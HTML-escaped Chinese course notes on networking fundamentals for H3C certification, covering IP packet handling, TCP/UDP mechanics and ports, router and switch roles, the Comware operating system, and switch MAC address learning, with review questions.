&lt;li&gt;查路由表&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425214211.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;主机接收ip包&#34;&gt;主机接收IP包&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;如果IP包的目的地址符合下列情况之一，则主机接收此包
&lt;ul&gt;
&lt;li&gt;目的IP地址等于自己的IP地址&lt;/li&gt;
&lt;li&gt;目的IP地址是一个广播地址&lt;/li&gt;
&lt;li&gt;目的IP地址是一个组播地址，而本机的某个服务属于此组播组&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;否则主机的网络层丢弃此IP包&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425214438.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;广播风暴&#34;&gt;广播风暴&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;路由器转发广播将导致全网充斥广播，可能引发广播风暴&lt;/li&gt;
&lt;li&gt;路由器默认不转发广播&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425214650.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;本节总结-1&#34;&gt;本节总结&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;32位IP地址分为网络号和主机号两部分，用以标识网络和主机&lt;/li&gt;
&lt;li&gt;主机将跨网段IP包交给默认网关，路由器负责跨网段转发数据包&lt;/li&gt;
&lt;li&gt;ARP协议用于把已知的IP地址解析位MAC地址&lt;/li&gt;
&lt;li&gt;RARP用于在数据链路层地址已知时解析IP地址&lt;/li&gt;
&lt;li&gt;ICMP定义了网络层控制和传递消息的功能&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;本节习题&#34;&gt;本节习题&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;IP主要作用&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;标识节点和链路&lt;/li&gt;
&lt;li&gt;寻址和转发&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;IP地址头部长度20字节&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;版本号&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;TOS&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;TTL&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;协议号&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;IP地址分为网络号和主机号&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;网络号用于区分网络&lt;/li&gt;
&lt;li&gt;主机号用于标识网络的一个IP节点&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;IP地址分类&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A类：1~126 127保留（本地回环地址）&lt;/li&gt;
&lt;li&gt;B类：128~191&lt;/li&gt;
&lt;li&gt;C类：192~223&lt;/li&gt;
&lt;li&gt;D类：224~239（组播地址）&lt;/li&gt;
&lt;li&gt;E类：保留&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;特殊地址&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;网络地址（主机位全部为0）&lt;/li&gt;
&lt;li&gt;网段广播地址（主机位全部为1）&lt;/li&gt;
&lt;li&gt;回环地址（127网段）&lt;/li&gt;
&lt;li&gt;所有网络地址（网络地址、主机地址全0）&lt;/li&gt;
&lt;li&gt;全网广播地址（网络地址、主机地址全1）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;ICMP报文&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;ARP地址解析协议&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;RARP反向地址解析协议&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;把MAC地址解析成IP地址（无盘工作站）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;主机发送、接收数据包&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;路由器发送数据包&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;5-tcp与udp的基本原理&#34;&gt;5. TCP与UDP的基本原理&lt;/h2&gt;
&lt;h3 id=&#34;引入-3&#34;&gt;引入&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;TCP/IP协议族的传输层协议主要包括TCP和UDP&lt;/li&gt;
&lt;li&gt;TCP是面向连接的可靠的传输层协议，它支持在不可靠的网络上实现面向连接的可靠的数据传输&lt;/li&gt;
&lt;li&gt;UDP是无连接的传输协议，主要用于支持在较可靠的链路上的数据传输你，或用于对延迟较敏感的应用&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;课程目标-4&#34;&gt;课程目标&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;了解TCP/UDP协议所提供的服务&lt;/li&gt;
&lt;li&gt;了解TCP/UDP的报文结构&lt;/li&gt;
&lt;li&gt;掌握TCP建立和拆除的过程&lt;/li&gt;
&lt;li&gt;掌握TCP的滑动窗口机制&lt;/li&gt;
&lt;li&gt;掌握TCP的可靠性技术&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;课程目录-1&#34;&gt;课程目录&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;TCP/IP传输层的作用&lt;/li&gt;
&lt;li&gt;TCP基本原理&lt;/li&gt;
&lt;li&gt;UDP基本原理&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;tcpip传输层的作用&#34;&gt;TCP/IP传输层的作用&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;提供面向连接或无连接的服务&lt;/li&gt;
&lt;li&gt;维护连接状态&lt;/li&gt;
&lt;li&gt;对应用层数据进行分段和封装&lt;/li&gt;
&lt;li&gt;实现多路复用&lt;/li&gt;
&lt;li&gt;可靠地传输数据&lt;/li&gt;
&lt;li&gt;执行流量控制&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;tcp基本原理&#34;&gt;TCP基本原理&lt;/h3&gt;
&lt;h4 id=&#34;tcp的特点&#34;&gt;TCP的特点&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;三次握手
&lt;ul&gt;
&lt;li&gt;建立可靠连接&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;端口号
&lt;ul&gt;
&lt;li&gt;多路复用&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;完整性校验
&lt;ul&gt;
&lt;li&gt;差错检测&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;确认机制
&lt;ul&gt;
&lt;li&gt;应答接收&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;序列号
&lt;ul&gt;
&lt;li&gt;丢失检测、乱序重排&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;窗口机制
&lt;ul&gt;
&lt;li&gt;流量控制&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;tcp封装&#34;&gt;TCP封装&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;源端口&lt;/li&gt;
&lt;li&gt;目标端口&lt;/li&gt;
&lt;li&gt;序列号&lt;/li&gt;
&lt;li&gt;确认号&lt;/li&gt;
&lt;li&gt;数据偏移&lt;/li&gt;
&lt;li&gt;保留&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425230918.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;tcpudp端口号&#34;&gt;TCP/UDP端口号&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;每个IP地址可以提供16个源端口号和16个目的端口号，大约提供2^16^个端口号，65535个&lt;/li&gt;
&lt;li&gt;知名端口号&amp;lt;1023&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425231602.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;tcp连接的建立&#34;&gt;TCP连接的建立&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;三次握手的建立过程&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425234440.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;tcp连接的拆除&#34;&gt;TCP连接的拆除&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;四次挥手的拆除过程&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425234842.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;传输确认&#34;&gt;传输确认&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425234956.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;超时重传&#34;&gt;超时重传&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425235332.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;滑动窗口&#34;&gt;滑动窗口&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425235633.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;udp基本原理&#34;&gt;UDP基本原理&lt;/h3&gt;
&lt;h4 id=&#34;udp封装&#34;&gt;UDP封装&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425235822.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;tcp与udp的对比&#34;&gt;TCP与UDP的对比&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425235843.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;本节总结-2&#34;&gt;本节总结&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;TCP和UDP通过端口号标识上层应用和服务&lt;/li&gt;
&lt;li&gt;TCP通过三次握手建立可靠连接&lt;/li&gt;
&lt;li&gt;TCP通过校验和进行差错校验，通过序列号、确认和超时重传机制实现可靠传输，通过滑动窗口实现流量控制&lt;/li&gt;
&lt;li&gt;UDP实现简单，资源占用少，实时性强，适用于可靠性高的网络和延迟敏感的应用&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;本节习题-1&#34;&gt;本节习题&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;传输层的作用：&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;提供面向连接或无连接的服务&lt;/li&gt;
&lt;li&gt;维护连接状态&lt;/li&gt;
&lt;li&gt;对应用层数据进行分段和封装&lt;/li&gt;
&lt;li&gt;实现多路复用&lt;/li&gt;
&lt;li&gt;可靠地传输数据&lt;/li&gt;
&lt;li&gt;执行流量控制&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;TCP协议&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;三次握手&lt;/li&gt;
&lt;li&gt;端口号&lt;/li&gt;
&lt;li&gt;完整性校验&lt;/li&gt;
&lt;li&gt;确认机制&lt;/li&gt;
&lt;li&gt;序列号&lt;/li&gt;
&lt;li&gt;窗口机制&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;知名端口号小于1023&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;TCP：&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;telnet：23&lt;/li&gt;
&lt;li&gt;FTP：20、21&lt;/li&gt;
&lt;li&gt;HTTP：80&lt;/li&gt;
&lt;li&gt;SMTP：25&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;UDP：&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;SNMP：161&lt;/li&gt;
&lt;li&gt;DHCP：67/68&lt;/li&gt;
&lt;li&gt;DNS：53&lt;/li&gt;
&lt;li&gt;TFTP：69&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;TCP 3次握手 4次握手&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;UDP协议优点&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;实现简单&lt;/li&gt;
&lt;li&gt;带宽浪费小，体验效率高&lt;/li&gt;
&lt;li&gt;延迟小&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;第三章网络设备操作入门&#34;&gt;第三章：网络设备操作入门&lt;/h1&gt;
&lt;h2 id=&#34;1-路由器交换机及其操作系统介绍&#34;&gt;1. 路由器、交换机及其操作系统介绍&lt;/h2&gt;
&lt;h3 id=&#34;引入-4&#34;&gt;引入&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;构建大、中、小型企业网络的主要设备是路由器和交换机&lt;/li&gt;
&lt;li&gt;H3C公司提供全系列路由器、交换机及其它网络设备&lt;/li&gt;
&lt;li&gt;控制路由器和交换机工作的核心软件是网络设备的操作系统&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;课程目标-5&#34;&gt;课程目标&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;了解路由器、交换机的基本概念&lt;/li&gt;
&lt;li&gt;初步了解路由器和交换机的组成&lt;/li&gt;
&lt;li&gt;掌握网络设备操作系统的作用与特点&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;目录-3&#34;&gt;目录&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;路由器与交换机的作用与特点&lt;/li&gt;
&lt;li&gt;H3C路由器与交换机介绍&lt;/li&gt;
&lt;li&gt;H3C 网络设备操作系统&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;路由器与交换机的作用与特点&#34;&gt;路由器与交换机的作用与特点&lt;/h3&gt;
&lt;h4 id=&#34;路由器的作用&#34;&gt;路由器的作用&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;连接具有不同介质的链路&lt;/li&gt;
&lt;li&gt;连接网络或子网，隔离广播&lt;/li&gt;
&lt;li&gt;对数据报文执行寻路和转发&lt;/li&gt;
&lt;li&gt;交换和维护路由信息&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200419232543.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;路由器的特点&#34;&gt;路由器的特点&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;主要工作在OSI模型的物理层、数据链路层和网络层&lt;/li&gt;
&lt;li&gt;根据网络层信息进行路由转发&lt;/li&gt;
&lt;li&gt;提供丰富的接口模型&lt;/li&gt;
&lt;li&gt;支持丰富的链路层协议&lt;/li&gt;
&lt;li&gt;支持多种路由协议&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;交换机的作用&#34;&gt;交换机的作用&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;连接多个以太网物理段，隔离冲突域&lt;/li&gt;
&lt;li&gt;对以太网帧进行高速而透明的交换转发&lt;/li&gt;
&lt;li&gt;自行学习和维护MAC地址信息&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200419232937.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;交换机的特点&#34;&gt;交换机的特点&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;主要工作在OSI模型的物理层、数据链路层&lt;/li&gt;
&lt;li&gt;提供以太网间的透明桥接和交换&lt;/li&gt;
&lt;li&gt;依据链路层的MAC地址，将以太网数据帧在端口间进行转发&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;路由器与交换机的发展趋势&#34;&gt;路由器与交换机的发展趋势&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;路由和交换的融合&lt;/li&gt;
&lt;li&gt;多业务功能的融合&lt;/li&gt;
&lt;li&gt;设备虚拟化&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;h3c路由器与交换机介绍&#34;&gt;H3C路由器与交换机介绍&lt;/h3&gt;
&lt;h4 id=&#34;h3c路由器系列&#34;&gt;H3C路由器系列&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200419233508.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;示例&#34;&gt;示例&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200419233609.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;h3c交换机系列&#34;&gt;H3C交换机系列&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200419233655.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;h3c交换机命名规则&#34;&gt;H3C交换机命名规则&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200419233725.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;h3c交换机示例&#34;&gt;H3C交换机示例&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200426000419.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;h3c网络数设备操作系统&#34;&gt;H3C网络数设备操作系统&lt;/h3&gt;
&lt;h4 id=&#34;comware的作用&#34;&gt;Comware的作用&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Comware是设备运行的网络操作系统，H3C产品的核心软件平台&lt;/li&gt;
&lt;li&gt;对硬件驱动和底层操作系统进行屏蔽与封装&lt;/li&gt;
&lt;li&gt;集成了丰富的链路层协议、以太网交换、IP路由及转发、安全等功能模块&lt;/li&gt;
&lt;li&gt;制定了软硬件接口标准规范，对第三方厂商提供开放平台与接口&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;comware的特点&#34;&gt;Comware的特点&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;支持IPv4及IPv6协议&lt;/li&gt;
&lt;li&gt;支持多CPU&lt;/li&gt;
&lt;li&gt;路由和交换功能融合&lt;/li&gt;
&lt;li&gt;高可靠性和弹性扩展&lt;/li&gt;
&lt;li&gt;灵活的裁减和定制功能&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;本节总结-3&#34;&gt;本节总结&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;路由器是利用三层IP地址信息进行报文转发的互联设备&lt;/li&gt;
&lt;li&gt;交换机是利用二层MAC信息进行数据帧交换的互联设备&lt;/li&gt;
&lt;li&gt;路由器、交换机的运行依赖的软件核心是网络设备的操作系统&lt;/li&gt;
&lt;li&gt;H3C Comware软件平台是H3C IP网络设备的核心软件平台&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;本节习题-2&#34;&gt;本节习题&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;路由器作用&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;连接具有不同介质的链路&lt;/li&gt;
&lt;li&gt;连接网络或子网，隔离广播&lt;/li&gt;
&lt;li&gt;对数据报文执行寻路和转发&lt;/li&gt;
&lt;li&gt;交换和维护路由信息&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;路由器特点&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;主要工作在OSI模型的物理层、数据链路层和网络层&lt;/li&gt;
&lt;li&gt;根据网络层信息进行路由转发&lt;/li&gt;
&lt;li&gt;提供丰富的接口类型&lt;/li&gt;
&lt;li&gt;支持丰富的链路层协议&lt;/li&gt;
&lt;li&gt;支持多种路由协议&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;交换机作用&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;连接多个以太网物理段，隔离冲突域&lt;/li&gt;
&lt;li&gt;对以太网帧进行高速而透明的交换转发&lt;/li&gt;
&lt;li&gt;自行学习和维护MAC地址信息&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;交换机特点&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;主要工作在OSI模型的物理层、数据链路层&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;提供以太网间的透明桥接和交换&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;依据链路层的MAC地址，将以太网数据帧在端口间进行转发&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;h3c产品命名规则&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;**h3c产品操作系统：**Comware&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;华为VRP Cisco IOS&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;2-命令行操作基础&#34;&gt;2. 命令行操作基础&lt;/h2&gt;
&lt;h3 id=&#34;引入-5&#34;&gt;引入&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;可以通过Console、AUX、Tlenet和SSH多种途径，搭建网络设备配置环境&lt;/li&gt;
&lt;li&gt;H3C Comware在上述配置方法中使用的命令行采用了配置权限的分级控制&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;课程目标-6&#34;&gt;课程目标&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;掌握配置网络设备的基本方法&lt;/li&gt;
&lt;li&gt;掌握分级命令行的使用方法&lt;/li&gt;
&lt;li&gt;掌握网络设备的常用配置命令&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;课程目录-2&#34;&gt;课程目录&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;配置网络设备的方法&lt;/li&gt;
&lt;li&gt;命令行使用入门&lt;/li&gt;
&lt;li&gt;常用的命令&lt;/li&gt;
&lt;li&gt;配置远程登录&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;配置网络设备的方法&#34;&gt;配置网络设备的方法&lt;/h3&gt;
&lt;h4 id=&#34;访问网络设备命令行接口的方法&#34;&gt;访问网络设备命令行接口的方法&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;通过Console口本地访问&lt;/li&gt;
&lt;li&gt;通过AUX远程访问&lt;/li&gt;
&lt;li&gt;使用Telnet终端访问&lt;/li&gt;
&lt;li&gt;使用SSH终端访问&lt;/li&gt;
&lt;li&gt;通过异步串口访问&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;使用console口进行连接&#34;&gt;使用Console口进行连接&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200426001823.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;创建新连接&#34;&gt;创建新连接&lt;/h5&gt;
&lt;h1 id=&#34;第三章配置局域网交换&#34;&gt;第三章：配置局域网交换&lt;/h1&gt;
&lt;h2 id=&#34;1-以太网交换机工作原理&#34;&gt;1. 以太网交换机工作原理&lt;/h2&gt;
&lt;h3 id=&#34;课程目标-7&#34;&gt;课程目标&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;了解共享式以太网和交换式以太网的区别&lt;/li&gt;
&lt;li&gt;掌握交换机中MAC地址表的学习过程&lt;/li&gt;
&lt;li&gt;掌握交换机的过滤、转发原理&lt;/li&gt;
&lt;li&gt;掌握广播域的概念&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;课程目录-3&#34;&gt;课程目录&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;共享式与交换式以太网&lt;/li&gt;
&lt;li&gt;交换机的MAC地址表学习过程&lt;/li&gt;
&lt;li&gt;交换机对数据帧的过滤与转发&lt;/li&gt;
&lt;li&gt;广播域&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;共享式以太网&#34;&gt;共享式以太网&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;共享式以太网中，所有的终端主机都处于同一个冲突域中，局域网中的所有接入终端共享总线的带宽&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200424183124.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;交换式以太网&#34;&gt;交换式以太网&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;在交换式以太网中，交换机的每个端口处于独立的冲突域中，终端主机独占端口的带宽&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200424183221.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;mac地址表初始化&#34;&gt;MAC地址表初始化&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;交换机刚启动时，MAC地址表内无表项&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425002146.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;mac地址表学习过程&#34;&gt;MAC地址表学习过程&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;PCA发出数据帧&lt;/li&gt;
&lt;li&gt;交换机把PCA的帧中的源地址MAC_A与接收到此帧的端口E1/0/1关联起来&lt;/li&gt;
&lt;li&gt;交换机把PCA的帧从所有其他端口发送出去（除了接收到帧的端口E1/0/1）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425002456.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PCB、PCC、PCD发出数据帧&lt;/li&gt;
&lt;li&gt;交换机把接收到的帧中的源地址与相应的端口关联起来&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425002610.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;单播帧的转发&#34;&gt;单播帧的转发&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;PCA发出目的到PCD的单播数据帧&lt;/li&gt;
&lt;li&gt;交换机根据帧中的目的地址，从相应的端口E1/0/4发送出去&lt;/li&gt;
&lt;li&gt;交换机不在其他端口上转发此单播数据帧&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425002840.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;广播组播和未知单播帧的转发&#34;&gt;广播、组播和未知单播帧的转发&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;交换机会把广播、组播和未知单播帧从所有其他端口发送出去（除了接收到帧的端口）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425003002.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
